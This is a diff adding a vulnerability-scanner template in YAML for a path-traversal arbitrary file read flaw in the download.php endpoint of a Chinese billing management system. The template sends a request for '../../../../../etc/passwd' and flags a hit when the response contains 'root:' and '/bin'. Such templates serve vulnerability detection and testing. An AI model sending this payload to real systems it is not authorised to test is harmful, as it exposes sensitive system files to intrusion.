@@ -1,0 +1,30 @@
+id: lhzy-billing-management-system-file-read
+
+info:
+  name: 蓝海卓越 计费管理系统 download.php 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    蓝海卓越计费管理系统存在任意文件读取漏洞，可通过 download.php 接口读取系统敏感文件。
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/download.php?file=../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        condition: and
+      - type: word
+        words:
+          - "<"
+        negative: true
+        condition: and
